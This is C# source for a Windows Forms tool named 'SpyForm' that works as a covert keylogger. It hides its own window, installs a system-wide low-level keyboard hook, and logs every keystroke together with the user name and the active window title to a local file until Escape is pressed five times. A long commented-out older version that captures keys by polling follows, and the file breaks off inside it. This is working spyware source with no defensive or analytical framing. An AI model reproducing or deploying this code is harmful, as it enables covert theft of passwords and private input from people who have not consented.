using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Diagnostics;
using System.Drawing.Imaging;

namespace Zetsu
{

    public partial class SpyForm : Form
    {

        public SpyForm()
        {
            InitializeComponent();

        }

        public static string logName = Path.Combine(Environment.CurrentDirectory, 
            $"logs.{DateTime.Now.ToShortDateString()}_{DateTime.Now.ToShortTimeString().Replace(":", ".")}.log");
        public static string lastTitle = "";
        public static string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr GetModuleHandler(string moduleName);

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetProcAddress(IntPtr module, string procedureName);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern IntPtr SetWindowsHookEx(HookType hookType, HookProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, WM wParam, [In] KBLHOOKSTRUCT lParam);

        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, WM wParam, [In] MSLLHOOKSTRUCT lParam);

        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool PeekMessage(IntPtr lpMsg, IntPtr hWnd, uint wMsgFilterMin, uint wMsgFilterMax, uint wRemoveMsg);

        [DllImport("user32.dll")]
        static extern short GetAsyncKeyState(System.Windows.Forms.Keys vKey);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);


        delegate IntPtr HookProc(int code, IntPtr wParam, IntPtr lParam);

        [StructLayout(LayoutKind.Sequential)]
        public struct NativeMessage
        {
            public IntPtr handle;
            public uint message;
            public IntPtr wParam;
            public IntPtr lParam;
            public uint time;
            public Point p;
        }

        public enum HookType : int
        {
            WH_JOURNALRECORD = 0,
            WH_JOURNALPLAYBACK = 1,
            WH_KEYBOARD = 2,
            WH_GETMESSAGE = 3,
            WH_CALLWNDPROC = 4,
            WH_CBT = 5,
            WH_SYSMSGFILTER = 6,
            WH_MOUSE = 7,
            WH_HARDWARE = 8,
            WH_DEBUG = 9,
            WH_SHELL = 10,
            WH_FOREGROUNDIDLE = 11,
            WH_CALLWNDPROCRET = 12,
            WH_KEYBOARD_LL = 13,
            WH_MOUSE_LL = 14
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KBLHOOKSTRUCT
        {
            public uint vkCode;
            public uint scanCode;
            public KBDLLHOOKSTRUCTFlags flags;
            public uint time;
            public UIntPtr dwExtraInfo;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct MSLLHOOKSTRUCT
        {
            public POINT pt;
            public int mouseData; 
            public int flags;
            public int time;
            public UIntPtr dwExtraInfo;
        }

        [Flags]
        public enum KBDLLHOOKSTRUCTFlags : uint
        {
            LLKHF_EXTENDED = 0x01,
            LLKHF_INJECTED = 0x10,
            LLKHF_ALTDOWN = 0x20,
            LLKHF_UP = 0x80,
        }

        public struct POINT
        {
            public FIXED x;
            public FIXED y;
        }

        public struct FIXED
        {
            public short fract;
            public short value;
        }

        public enum WM : uint
        {
            NULL = 0x0000,
            CREATE = 0x0001,
            DESTROY = 0x0002,
            MOVE = 0x0003,
            SIZE = 0x0005,
            ACTIVATE = 0x0006,
            SETFOCUS = 0x0007,
            KILKFOCUS = 0x0008,
            ENABLE = 0x000A,
            SETREDRAW = 0x000B,
            SETTEXT = 0x000C,
            GETTEXT = 0x000D,
            GETTEXTLENGTH = 0x000E,
            PAINT = 0x000F,
            CLOSE = 0x0010,
            QUERYENDSESSION = 0x0011,
            QUERYOPEN = 0x0013,
            ENDSESSION = 0x0016,
            QUIT = 0x0012,
            ERASEBKGRD = 0x0014,
            SYSCOLORCHANGE = 0x0015,
            SHOWWINDOW = 0x0018,
            WININCHANGE = 0x001A,
            SETTINGCHANGE = WININCHANGE,
            DEVMODECHANGE = 0X001B,
            ACTIVATEAPP = 0x001C,
            FONTCHANGE = 0x001D,
            TIMECHANGE = 0x001E,
            CANCELMODE = 0x001F,
            SETCURSOR = 0x0020,
            MOUSEACTIVATE = 0x0021,
            CHILDACTIVATE = 0x0022,
            QUEUESYNC = 0x0023,
            GETMINMAXINFO = 0x0024,
            PAINTICON = 0x0026,
            ICONERASEBKGND = 0x0027,
            NEXTDLGTCL = 0x0028,
            SPOOLERSTATUS = 0x002A,
            DRAWITEM = 0x002B,
            MEASUREITEM = 0x002C,
            DELETEITEM = 0x002D,
            VKEYTOITEM = 0x002E,
            CHARTOITEM = 0x002F,
            SETFONT = 0x0030,
            GETFONT = 0x0031,
            SETHOTKEY = 0x0032,
            GETHOTKEY = 0x0033,
            QUERYDRAGICON = 0x0037,
            COMPAREITEM = 0x0039,
            GETOBJECT = 0x003D,
            COMPACTING = 0x0041,
            [Obsolete]
            COMMNOTIFY = 0x0044,
            WINDOWPOSCHANGING = 0x0046,
            WINDOWPOSCHANGED = 0x0047,
            [Obsolete]
            POWER = 0x0048,
            COPYDATA = 0x004A,
            CANCELJOURNAL = 0x004B,
            NOTIFY = 0x004E,
            INPUTLANGCHANGEREQUEST = 0x0050,
            INPUTLANGCHANGE = 0x0051,
            TCARD = 0x0052,
            HELP = 0x0053,
            USERCHANGED = 0x0054,
            NOTIFYFORMAT = 0x0055,
            CONTEXTMENU = 0x007B,
            STYLECHANGING = 0x007C,
            STYLECHANGED = 0x007D,
            DISPLAYCHANGE = 0x007E,
            GETICON = 0x007F,
            SETICON = 0x0080,
            NCCREATE = 0x0081,
            NCDESTROY = 0x0082,
            NCCALCSIZE = 0x0083,
            NCHITTEST = 0x0084,
            NCPAINT = 0x0085,
            NCACTIVATE = 0x0086,
            GETDLGCODE = 0x0087,
            SYNCPAINT = 0x0088,
            NCMOUSEMOVE = 0x00A0,
            NCLBUTTONDOWN = 0x00A1,
            NCLBUTTONUP = 0x00A2,
            NCLBUTTONDBLCLK = 0x00A3,
            NCRBUTTONDOWN = 0x00A4,
            NCRBUTTONUP = 0x00A5,
            NCRBUTTONDBLCLK = 0x00A6,
            NCMBUTTONDOWN = 0x00A7,
            NCMBUTTONUP = 0x00A8,
            NCMBUTTONDBLCLK = 0x00A9,
            NCXBUTTONDOWN = 0x00AB,
            NCXBUTTONUP = 0x00AC,
            NCXBUTTONDBLCLK = 0x00AD,
            INPUT_DEVICE_CHANGE = 0x00FE,
            INPUT = 0x00FF,
            KEYFIRST = 0x0100,
            KEYDOWN = 0x0100,
            KEYUP = 0x0101,
            CHAR = 0x0102,
            DEADCHAR = 0x0103,
            SYSKEYDOWN = 0x0104,
            SYSKEYUP = 0x0105,
            SYSCHAR = 0x0106,
            SYSDEADCHAR = 0x0107,
            UNICHAR = 0x0109,
            KEYLAST = 0x0108,
            IME_STARTCOMPOSITION = 0x010D,
            IME_ENDCOMPOSITION = 0x010E,
            IME_COMPOSITION = 0x010F,
            IME_KEYLAST = 0x010F,
            INITDIALOG = 0x0110,
            COMMAND = 0x0111,
            SYSCOMMAND = 0x0112,
            TIMER = 0x0113,
            HSCROLL = 0x0114,
            VSCROLL = 0x0115,
            INITMENU = 0x0116,
            INITMENUPOPUP = 0x0117,
            MENUSELECT = 0x011F,
            MENUCHAR = 0x0120,
            ENTERIDLE = 0x0121,
            MENURBUTTONUP = 0x0122,
            MENUDRAG = 0x0123,
            MENUGETOBJECT = 0x0124,
            UNINITMENUPOPUP = 0x0125,
            MENUCOMMAND = 0x0126,
            CHANGEUISTATE = 0x0127,
            UPDATEUISTATE = 0x0128,
            QUERYUISTATE = 0x0129,
            CTLCOLORMSGBOX = 0x0132,
            CTLCOLOREDIT = 0x0133,
            CTLCOLORLISTBOX = 0x0134,
            CTLCOLORBTN = 0x0135,
            CTLCOLORDLG = 0x0136,
            CTLCOLORSCROLLBAR = 0x0137,
            CTLCOLORSTATIC = 0x0138,
            MOUSEFIRST = 0x0200,
            MOUSEMOVE = 0x0200,
            LBUTTONDOWN = 0x0201,
            LBUTTONUP = 0x0202,
            LBUTTONDBLCLK = 0x0203,
            RBUTTONDOWN = 0x0204,
            RBUTTONUP = 0x0205,
            RBUTTONDBLCLK = 0x0206,
            MBUTTONDOWN = 0x0207,
            MBUTTONUP = 0x0208,
            MBUTTONDBLCLK = 0x0209,
            MOUSEWHEEL = 0x020A,
            XBUTTONDOWN = 0x020B,
            XBUTTONUP = 0x020C,
            XBUTTONDBLCLK = 0x020D,
            MOUSEHWHEEL = 0x020E,
            MOUSELAST = 0x020E,
            PARENTNOTIFY = 0x0210,
            ENTERMENULOOP = 0x0211,
            EXITMENULOOP = 0x0212,
            NEXTMENU = 0x0213,
            SIZING = 0x0214,
            CAPTURECHANGED = 0x0215,
            MOVING = 0x0216,
            POWERBROADCAST = 0x0218,
            DEVICECHANGE = 0x0219,
            MDICREATE = 0x0220,
            MDIDESTROY = 0x0221,
            MDIACTIVATE = 0x0222,
            MDIRESTORE = 0x0223,
            MDINEXT = 0x0224,
            MDIMAXIMIZE = 0x0225,
            MDITILE = 0x0226,
            MDICASCADE = 0x0227,
            MDIICONARRANGE = 0x0228,
            MDIGETACTIVE = 0x0229,
            MDISETMENU = 0x0230,
            ENTERSIZEMOVE = 0x0231,
            EXITSIZEMOVE = 0x0232,
            DROPFILES = 0x0233,
            MDIREFRESHMENU = 0x0234,
            IME_SETCONTEXT = 0x0281,
            IME_NOTIFY = 0x0282,
            IME_CONTROL = 0x0283,
            IME_COMPOSITIONFULL = 0x0284,
            IME_SELECT = 0x0285,
            IME_CHAR = 0x0286,
            IME_REQUEST = 0x0288,
            IME_KEYDOWN = 0x0290,
            IME_KEYUP = 0x0291,
            MOUSEHOVER = 0x02A1,
            MOUSELEAVE = 0x02A3,
            NCMOUSEHOVER = 0x02A0,
            NCMOUSELEAVE = 0x02A2,
            WTSSESSION_CHANGE = 0x02B1,
            TABLET_FIRST = 0x02c0,
            TABLET_LAST = 0x02df,
            CUT = 0x0300,
            COPY = 0x0301,
            PASTE = 0x0302,
            CLEAR = 0x0303,
            UNDO = 0x0304,
            RENDERFORMAT = 0x0305,
            RENDERALLFORMATS = 0x0306,
            DESTROYCLIPBOARD = 0x0307,
            DRAWCLIPBOARD = 0x0308,
            PAINTCLIPBOARD = 0x0309,
            VSCROLLCLIPBOARD = 0x030A,
            SIZECLIPBOARD = 0x030B,
            ASKCBFORMATNAME = 0x030C,
            CHANGECBCHAIN = 0x030D,
            HSCROLLCLIPBOARD = 0x030E,
            QUERYNEWPALETTE = 0x030F,
            PALETTEISCHANGING = 0x0310,
            PALETTECHANGED = 0x0311,
            HOTKEY = 0x0312,
            PRINT = 0x0317,
            PRINTCLIENT = 0x0318,
            APPCOMMAND = 0x0319,
            THEMECHANGED = 0x031A,
            CLIPBOARDUPDATE = 0x031D,
            DWMCOMPOSITIONCHANGED = 0x031E,
            DWMNCRENDERINGCHANGED = 0x031F,
            DWMCOLORIZATIONCOLORCHANGED = 0x0320,
            DWMWINDOWMAXIMIZEDCHANGE = 0x0321,
            GETTITLEBARINFOEX = 0x033F,
            HANDHELDFIRST = 0x0358,
            HANDHELDLAST = 0x035F,
            AFXFIRST = 0x0360,
            AFXLAST = 0x037F,
            PENWINFIRST = 0x0380,
            PENWINLAST = 0x038F,
            APP = 0x8000,
            USER = 0x0400,
            CPL_LAUNCH = USER + 0x1000,
            CPL_LAUNCHED = USER + 0x1001,
            SYSTIMER = 0x118,
            HSHELL_ACCESSIBILITYSTATE = 11,
            HSHELL_ACTIVATESHELLWINDOW = 3,
            HSHELL_APPCOMMAND = 12,
            HSHELL_GETMINRECT = 5,
            HSHELL_LANGUAGE = 8,
            HSHELL_REDRAW = 6,
            HSHELL_TASKMAN = 7,
            HSHELL_WINDOWCREATED = 1,
            HSHELL_WINDOWDESTROYED = 2,
            HSHELL_WINDOWACTIVATED = 4,
            HSHELL_WINDOWREPLACED = 13

        }

        public IntPtr CallbackFunction(Int32 code, IntPtr wParam, IntPtr lParam)
        {
            int messageType = wParam.ToInt32();
            int vKey;
            string key = "";
            if (code >= 0 && (messageType == 0x100 || messageType == 0x104))
            {
                bool shift = false;
                IntPtr hWindow = GetForegroundWindow();
                short shiftState = GetAsyncKeyState(Keys.ShiftKey);
                if ((shiftState & 0x8000) == 0x8000)
                {
                    shift = true;
                }
                var caps = Console.CapsLock;
                bool flag = false;
                vKey = Marshal.ReadInt32(lParam);

                if (vKey > 64 && vKey < 91)
                {
                    if (shift | caps)
                    {
                        key = ((Keys)vKey).ToString();
                    }
                    else
                    {
                        key = ((Keys)vKey).ToString().ToLower();
                    }
                }
                else if (vKey >= 96 && vKey <= 111)
                {
                    switch (vKey)
                    {
                        case 96:
                            key = "0";
                            break;
                        case 97:
                            key = "1";
                            break;
                        case 98:
                            key = "2";
                            break;
                        case 99:
                            key = "3";
                            break;
                        case 100:
                            key = "4";
                            break;
                        case 101:
                            key = "5";
                            break;
                        case 102:
                            key = "6";
                            break;
                        case 103:
                            key = "7";
                            break;
                        case 104:
                            key = "8";
                            break;
                        case 105:
                            key = "9";
                            break;
                        case 106:
                            key = "*";
                            break;
                        case 107:
                            key = "+";
                            break;
                        case 108:
                            key = "|";
                            break;
                        case 109:
                            key = "-";
                            break;
                        case 110:
                            key = ".";
                            break;
                        case 111:
                            key = "/";
                            break;
                    }
                }
                else if ((vKey >= 48 && vKey <= 57) || (vKey >= 186 && vKey <= 192))
                {
                    if (shift)
                    {
                        switch (vKey)
                        {
                            case 48:
                                key = ")";
                                break;
                            case 49:
                                key = "!";
                                break;
                            case 50:
                                key = "@";
                                break;
                            case 51:
                                key = "#";
                                break;
                            case 52:
                                key = "$";
                                break;
                            case 53:
                                key = "%";
                                break;
                            case 54:
                                key = "^";
                                break;
                            case 55:
                                key = "&";
                                break;
                            case 56:
                                key = "*";
                                break;
                            case 57:
                                key = "(";
                                break;
                            case 186:
                                key = ":";
                                break;
                            case 187:
                                key = "+";
                                break;
                            case 188:
                                key = "<";
                                break;
                            case 189:
                                key = "_";
                                break;
                            case 190:
                                key = ">";
                                break;
                            case 191:
                                key = "?";
                                break;
                            case 192:
                                key = "~";
                                break;
                            case 219:
                                key = "{";
                                break;
                            case 220:
                                key = "|";
                                break;
                            case 221:
                                key = "}";
                                break;
                            case 222:
                                key = "\"";
                                break;
                        }
                    }
                    else
                    {
                        switch (vKey)
                        {
                            case 48:
                                key = "0";
                                break;
                            case 49:
                                key = "1";
                                break;
                            case 50:
                                key = "2";
                                break;
                            case 51:
                                key = "3";
                                break;
                            case 52:
                                key = "4";
                                break;
                            case 53:
                                key = "5";
                                break;
                            case 54:
                                key = "6";
                                break;
                            case 55:
                                key = "7";
                                break;
                            case 56:
                                key = "8";
                                break;
                            case 57:
                                key = "9";
                                break;
                            case 186:
                                key = ";";
                                break;
                            case 187:
                                key = "=";
                                break;
                            case 188:
                                key = ",";
                                break;
                            case 189:
                                key = "-";
                                break;
                            case 190:
                                key = ".";
                                break;
                            case 191:
                                key = "/";
                                break;
                            case 192:
                                key = "`";
                                break;
                            case 219:
                                key = "[";
                                break;
                            case 220:
                                key = "\\";
                                break;
                            case 221:
                                key = "]";
                                break;
                            case 222:
                                key = "'";
                                break;
                        }
                    }
                }
                else
                {
                    switch ((Keys)vKey)
                    {
                        case Keys.F1:
                            key = "<F1>";
                            break;
                        case Keys.F2:
                            key = "<F2>";
                            break;
                        case Keys.F3:
                            key = "<F3>";
                            break;
                        case Keys.F4:
                            key = "<F4>";
                            break;
                        case Keys.F5:
                            key = "<F5>";
                            break;
                        case Keys.F6:
                            key = "<F6>";
                            break;
                        case Keys.F7:
                            key = "<F7>";
                            break;
                        case Keys.F8:
                            key = "<F8>";
                            break;
                        case Keys.F9:
                            key = "<F9>";
                            break;
                        case Keys.F10:
                            key = "<F10>";
                            break;
                        case Keys.F11:
                            key = "<F11>";
                            break;
                        case Keys.F12:
                            key = "<F12>";
                            break;
                        case Keys.Snapshot:
                            key = "<Print Screen>";
                            break;
                        case Keys.Scroll:
                            key = "<Scroll Lock>";
                            break;
                        case Keys.Pause:
                            key = "<Pause/Break>";
                            break;
                        case Keys.Insert:
                            key = "<Insert>";
                            break;
                        case Keys.Home:
                            key = "<Home>";
                            break;
                        case Keys.Delete:
                            key = "<Delete>";
                            break;
                        case Keys.End:
                            key = "<End>";
                            break;
                        case Keys.Prior:
                            key = "<Page Up>";
                            break;
                        case Keys.Next:
                            key = "<Page Down>";
                            break;
                        case Keys.Escape:
                            key = "<Esc>";
                            flag = true;
                            break;
                        case Keys.NumLock:
                            key = "<Num Lock>";
                            break;
                        case Keys.Capital:
                            key = "<Caps Lock>";
                            break;
                        case Keys.Tab:
                            key = "<Tab>";
                            break;
                        case Keys.Back:
                            key = "<Backspace>";
                            break;
                        case Keys.Enter:
                            key = "<Enter>";
                            break;
                        case Keys.Space:
                            key = " ";
                            break;
                        case Keys.Left:
                            key = "<Left>";
                            break;
                        case Keys.Up:
                            key = "<Up>";
                            break;
                        case Keys.Right:
                            key = "<Right>";
                            break;
                        case Keys.Down:
                            key = "<Down>";
                            break;
                        case Keys.LMenu:
                            key = "<Alt>";
                            break;
                        case Keys.RMenu:
                            key = "<Alt>";
                            break;
                        case Keys.LWin:
                            key = "<Windows Key>";
                            break;
                        case Keys.RWin:
                            key = "<Windows Key>";
                            break;
                        case Keys.LControlKey:
                            key = "<Ctrl>";
                            break;
                        case Keys.RControlKey:
                            key = "<Ctrl>";
                            break;
                    }
                }
                StringBuilder title = new StringBuilder(256);
                GetWindowText(hWindow, title, title.Capacity);
                Dictionary<string, string> valuePairs = new Dictionary<string, string>();
                valuePairs["Key"] = key;
                valuePairs["Time"] = DateTime.Now.ToString("yyyy-MM-dd hh:mm:ss tt");
                valuePairs["Window"] = title.ToString();
                if (valuePairs["Window"] != lastTitle)
                {
                    string titleString = "====================================LOG RECORD START====================================\nUser    : "
                        + userName + "\n" + "Window  : " + valuePairs["Window"] + "\n" + "Time    : " + valuePairs["Time"] + "\n" +
                        "LogFile : " + logName + "\n" + "----------------------------------------------\nLog data: \r\n";
                    Trace.WriteLine("");
                    Trace.WriteLine("");
                    Trace.WriteLine(titleString);
                    GC.Collect();
                    lastTitle = valuePairs["Window"];
                }
                Trace.Write(valuePairs["Key"]);

                if (flag)
                {
                    int count = Convert.ToInt32(textBox1.Text.ToString());
                    count += 1;
                    textBox1.Text = count.ToString();
                }
                else
                {
                    textBox1.Text = "0";
                }
            }

            return CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
        }

        private void StartButton_Click(object sender, EventArgs e)
        {
            this.Hide();
            try
            {
                Trace.Listeners.Clear();
                TextWriterTraceListener textWriter = new TextWriterTraceListener(logName);
                textWriter.Name = "TextLogger";
                textWriter.TraceOutputOptions = TraceOptions.ThreadId | TraceOptions.DateTime;
                ConsoleTraceListener traceListener = new ConsoleTraceListener(false);
                traceListener.TraceOutputOptions = TraceOptions.DateTime;
                Trace.Listeners.Add(textWriter);
                Trace.Listeners.Add(traceListener);
                Trace.AutoFlush = true;
                bool flag = true;
                HookProc callback = CallbackFunction;

                var hook = SetWindowsHookEx(HookType.WH_KEYBOARD_LL, callback, IntPtr.Zero, 0);
                while (flag)
                {
                    if (textBox1.Text == "5")
                    {
                        flag = false;
                        textBox1.Text = "0";
                        this.Show();
                        break;
                    }
                    PeekMessage(IntPtr.Zero, IntPtr.Zero, 0x100, 0x109, 0);
                    System.Threading.Thread.Sleep(5);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[ERROR] Exception: {0}", ex);
            }

        }

        private void SpyForm_FormClosed(object sender, FormClosedEventArgs e)
        {
            Form mainForm = Application.OpenForms[0];
            mainForm.Show();
        }

        //старый метод
        //[DllImport("user32.dll")]
        //public static extern int GetAsyncKeyState(Int32 i);

        //private void StartButton_Click(object sender, EventArgs e)
        //{
        //    this.Hide();
        //    bool shift = false;
        //    string buffer = string.Empty;
        //    string title = string.Empty;
        //    bool flag = true;
        //    DateTime dateTime = DateTime.Now;
        //    string fileName = "key" + dateTime.ToString().Replace(":", "") + ".log";
        //    while (flag)
        //    {
        //        Thread.Sleep(200);
        //        for(int i = 0; i < 255; i++)
        //        {
        //            if (buffer.Contains("12489"))
        //            {
        //                this.Show();
        //                flag = false;
        //            } 
        //            //title = IsForegroundOk();
        //            int state = GetAsyncKeyState(i);
        //            short shiftstate = (short)GetAsyncKeyState(16);
        //            if((shiftstate & 0x8000) == 0x8000)
        //            {
        //                shift = true;
        //            }
        //            else
        //            {
        //                shift = false;
        //            }
        //            var capsLock = Console.CapsLock;
        //            bool isBigSymbol = shift | capsLock;
        //            if(state != 0)
        //            {
        //                if (((Keys)i) == Keys.Space)
        //                {
        //                    buffer += " ";
        //                    continue;
        //                } 
        //                if (((Keys)i) == Keys.Enter)
        //                {
        //                    buffer += "\r\n";
        //                    continue;
        //                }
        //                if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton ||
        //                ((Keys)i) == Keys.MButton || ((Keys)i) == Keys.Home || 
        //                ((Keys)i) == Keys.End || ((Keys)i) == Keys.PrintScreen || 
        //                ((Keys)i) == Keys.PageDown || ((Keys)i) == Keys.PageUp ||
        //                ((Keys)i) == Keys.Up || ((Keys)i) == Keys.Down || 
        //                ((Keys)i) == Keys.Left || ((Keys)i) == Keys.Right || 
        //                ((Keys)i) == Keys.LControlKey || ((Keys)i) == Keys.Delete || 
        //                ((Keys)i) == Keys.ControlKey || ((Keys)i) == Keys.Pause ||
        //                ((Keys)i) == Keys.NumLock || ((Keys)i) == Keys.Menu ||
        //                ((Keys)i) == Keys.LMenu || ((Keys)i) == Keys.Tab || 
        //                ((Keys)i) == Keys.Escape)
        //                {
        //                    continue;
        //                }
        //                if (((Keys)i).ToString().Contains("Shift") || 
        //                    ((Keys)i) == Keys.Capital) 
        //                { 
        //                    continue; 
        //                }
        //                if (((Keys)i).ToString().Contains("D"))
        //                {
        //                    if (((Keys)i) == Keys.D0)
        //                    {
        //                        if(isBigSymbol)
        //                        {
        //                            buffer += ")";
        //                            continue;
        //                        }
        //                        else
        //                        {
        //                            buffer += "0";
        //                            continue;
        //                        }
        //                    }
        //                    if (((Keys)i) == Keys.D1)
        //                    {
        //                        if (isBigSymbol)
        //                        {
        //                            buffer += "!";
        //                            continue;
        //                        }
        //                        else
        //                        {
        //                            buffer += "1";
        //                            continue;
        //                        }
        //                    }
        //                    if (((Keys)i) == Keys.D2)
        //                    {
        //                        if (isBigSymbol)
        //                        {
        //                            buffer += "@";
        //                            continue;
        //                        }
        //                        else
        //                        {
        //                            buffer += "2";
        //                            continue;
        //                        }
        //                    }
        //                    if (((Keys)i) == Keys.D3)
        //                    {
        //                        if (isBigSymbol)
        //                        {
        //                            buffer += "#";
        //                            continue;
        //                        }
        //                        else
        //                        {
        //                            buffer += "3";
        //                            continue;
        //                        }
        //                    }
        //                    if (((Keys)i) == Keys.D4)
        //                    {
        //                        if (isBigSymbol)
        //                        {
        //                            buffer += "$";
        //                            continue;
        //                        }
        //                        else
        //                        {
        //                            buffer += "4";
        //                            continue;
        //                        }
        //                    }
        //                    if (((Keys)i) == Keys.D5)
        //                    {
        //                        if (isBigSymbol)
        //                        {
        //                            buffer += "%";
        //                            continue;
        //                        }
        //                        else
        //                        {
        //                            buffer += "5";
        //                            continue;
        //                        }
        //                    }
        //                    if (((Keys)i) == Keys.D6)
        //                    {
        //                        if (isBigSymbol)
        //                        {
        //                            buffer += "^";
        //                            continue;
        //                        }
        //                        else
        //                        {
        //                            buffer += "6";
        //                            continue;
        //                        }
        //                    }
        //                    if (((Keys)i) == Keys.D7)
        //                    {
        //                        if (isBigSymbol)
        //                        {
        //                            buffer += "&";
        //                            continue;
        //                        }
        //                        else
        //                        {
        //                            buffer += "7";
        //                            continue;
        //                        }
        //                    }
        //                    if (((Keys)i) == Keys.D8)
        //                    {
        //                        if (isBigSymbol)
        //                        {
        //                            buffer += "*";
        //                            continue;
        //                        }
        //                        else
        //                        {
        //                            buffer += "8";
        //                            continue;
        //                        }
        //                    }
        //                    if (((Keys)i) == Keys.D9)
        //                    {
        //                        if (isBigSymbol)
        //                        {
        //                            buffer += "(";
        //                            continue;
        //                        }
        //                        else
        //                        {
        //                            buffer += "9";
        //                            continue;
        //                        }
        //                    }
        //                }
        //                if (((Keys)i).ToString().Contains("Oem"))
        //                {
        //                    if (((Keys)i) == Keys.Oem1)
        //                    {
        //                        if (isBigSymbol)
        //                        {
        //                            buffer += ":";
        //                            continue;
        //                        }
        //                        else
        //                        {
        //                            buffer += ";";
        //                            continue;
        //                        }
        //                    }
        //                    if (((Keys)i) == Keys.Oem5)
        //                    {
        //                        if (isBigSymbol)
        //                        {
        //                            buffer += "|";
        //                            continue;
        //                        }
        //                        else
        //                        {
        //                            buffer += "\\";
        //                            continue;
        //                        }
        //                    }
        //                    if (((Keys)i) == Keys.Oem7)
        //                    {
        //                        if (isBigSymbol)
        //                        {
        //                            buffer += "\"";
        //                            continue;
        //                        }
        //                        else
        //                        {
        //                            buffer += "'";
        //                            continue;
        //                        }
        //                    }
        //                    if (((Keys)i) == Keys.OemMinus)
        //                    {
        //                        if (isBigSymbol)
        //                        {
        //                            buffer += "_";
        //                            continue;
        //                        }
        //                        else
        //                        {
        //                            buffer += "-";
        //                            continue;
        //                        }
        //                    }
        //                    if (((Keys)i) == Keys.OemPeriod)
        //                    {
        //                        if (isBigSymbol)
        //                        {
        //                            buffer += ">";
        //                            continue;
        //                        }
        //                        else
        //                        {
        //                            buffer += ".";
        //                            continue;
        //                        }
        //                    }
        //                    if (((Keys)i) == Keys.Oemcomma)
        //                    {
        //                        if (isBigSymbol)
        //                        {
        //                            buffer += "<";
        //                            continue;
        //                        }
        //                        else
        //                        {
        //                            buffer += ",";
        //                            continue;
        //                        }
        //                    }
        //                    if (((Keys)i) == Keys.OemOpenBrackets)
        //                    {
        //                        if (isBigSymbol)
        //                        {
        //                            buffer += "{";
        //                            continue;
        //                        }
        //                        else
        //                        {
        //                            buffer += "[";
        //                            continue;
        //                        }
        //                    }
        //                    if (((Keys)i) == Keys.OemCloseBrackets)
        //                    {
        //                        if (isBigSymbol)
        //                        {
        //                            buffer += "}";
        //                            continue;
        //                        }
        //                        else
        //                        {
        //                            buffer += "]";
        //                            continue;
        //                        }
        //                    }
        //                    if (((Keys)i) == Keys.Oemtilde)
        //                    {
        //                        if (isBigSymbol)
        //                        {
        //                            buffer += "~";
        //                            continue;
        //                        }
        //                        else
        //                        {
        //                            buffer += "`";
        //                            continue;
        //                        }
        //                    }
        //                    if (((Keys)i) == Keys.OemQuestion)
        //                    {
        //                        if (isBigSymbol)
        //                        {
        //                            buffer += "?";
        //                            continue;
        //                        }
        //                        else
        //                        {
        //                            buffer += "/";
        //                            continue;
        //                        }
        //                    }
        //                    if (((Keys)i) == Keys.Oemplus)
        //                    {
        //                        if (isBigSymbol)
        //                        {
        //                            buffer += "+";
        //                            continue;
        //                        }
        //                        else
        //                        {
        //                            buffer += "=";
        //                            continue;
        //                        }
        //                    }
        //                }
        //                if (((Keys)i).ToString().Contains("NumPad"))
        //                {
        //                    if (((Keys)i) == Keys.NumPad0)
        //                    {
        //                        buffer += "0";
        //                        continue;
        //                    }
        //                    if (((Keys)i) == Keys.NumPad1)
        //                    {
        //                        buffer += "1";
        //                        continue;
        //                    }
        //                    if (((Keys)i) == Keys.NumPad2)
        //                    {
        //                        buffer += "2";
        //                        continue;
        //                    }
        //                    if (((Keys)i) == Keys.NumPad3)
        //                    {
        //                        buffer += "3";
        //                        continue;
        //                    }
        //                    if (((Keys)i) == Keys.NumPad4)
        //                    {
        //                        buffer += "4";
        //                        continue;
        //                    }
        //                    if (((Keys)i) == Keys.NumPad5)
        //                    {
        //                        buffer += "5";
        //                        continue;
        //                    }
        //                    if (((Keys)i) == Keys.NumPad6)
        //                    {
        //                        buffer += "6";
        //                        continue;
        //                    }
        //                    if (((Keys)i) == Keys.NumPad7)
        //                    {
        //                        buffer += "7";
        //                        continue;
        //                    }
        //                    if (((Keys)i) == Keys.NumPad8)
        //                    {
        //                        buffer += "8";
        //                        continue;
        //                    }
        //                    if (((Keys)i) == Keys.NumPad9)
        //                    {
        //                        buffer += "9";
        //                        continue;
        //                    }
        //                }
        //                if((((Keys)i) == Keys.Multiply))
        //                {
        //                    buffer += "*";
        //                    continue;
        //                }
        //                if ((((Keys)i) == Keys.Decimal))
        //                {
        //                    buffer += ".";
        //                    continue;
        //                }
        //                if ((((Keys)i) == Keys.Divide))
        //                {
        //                    buffer += "/";
        //                    continue;
        //                }
        //                if ((((Keys)i) == Keys.Add))
        //                {
        //                    buffer += "+";
        //                    continue;
        //                }
        //                if ((((Keys)i) == Keys.Back))
        //                {
        //                    if (buffer != "")
        //                    buffer = buffer.Remove(buffer.Length-1);
        //                    continue;
        //                }
        //                if (((Keys)i).ToString().Length == 1)
        //                {
        //                    if(isBigSymbol)
        //                    {
        //                        buffer += ((Keys)i).ToString();
        //                    }
        //                    else
        //                    {
        //                        buffer += ((Keys)i).ToString().ToLowerInvariant();
        //                    }
        //                }   
        //                //else
        //                    //buffer += $"<{((Keys)i).ToString()}>";
